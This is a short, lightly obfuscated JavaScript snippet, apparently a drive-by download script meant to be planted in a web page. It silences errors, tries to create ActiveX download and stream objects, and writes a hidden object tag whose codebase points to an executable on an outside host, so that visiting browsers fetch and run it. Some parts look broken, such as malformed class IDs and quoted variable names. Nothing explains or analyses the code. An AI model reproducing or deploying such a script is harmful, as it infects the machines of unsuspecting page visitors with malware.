<script language="javascript">
function fgr() {return true;}
var kasp3r="Kasper";
var kasp3r2="Soset";
window.onerror=fgr;
var site="http://wmzarabotok.info/dos/test.exe";
var fu="Microsoft.XMLHTTP";
var ffe="ADODB.Stream";
var ka="kasp3r+kasp3r2"
try{
b=new ActiveXObject("'+fu+'");
o=new ActiveXObject(''+ffe+'');
   }
catch(e){};
try{document.write('<object cla'+'ssid=clsid:23746592-4354-3445-3565-%0 codebase="'+site+'" style=display:none>');}catch(e){document.write('<object classid=clsid:23726552-4354-3435-3565-%0 codebase="'+site+'" style=display:none></object>');}
</script>